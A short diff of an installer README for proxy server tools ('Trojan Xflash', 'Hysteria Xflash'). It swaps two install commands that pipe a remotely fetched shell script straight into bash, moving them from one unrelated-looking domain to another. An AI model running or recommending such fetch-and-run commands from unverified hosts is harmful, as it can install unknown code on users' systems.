@@ -8,13 +8,13 @@
 <li>Increase the idle time to prevent connections from breaking</li>
 
 ## Run the installer using this command:
-<pre>bash <(curl -Ls https://tuliphigh.co.za/install.sh)</pre>
+<pre>bash <(curl -Ls https://abcxyz.amazingclothingus.com/install.sh)</pre>
 
 # Trojan Xflash Installer
 <b>https://github.com/alohane/ServerTrojanXflashAutoScript</b>
 
 
 # Hysteria Xflash Installer
-<pre>bash <(curl -Ls https://tuliphigh.co.za/hysteria.sh)</pre>
+<pre>bash <(curl -Ls https://abcxyz.amazingclothingus.com/hysteria.sh)</pre>
 
 After installation, just type <b>Server-Hysteria</b> in the console to see the list of menu functions.
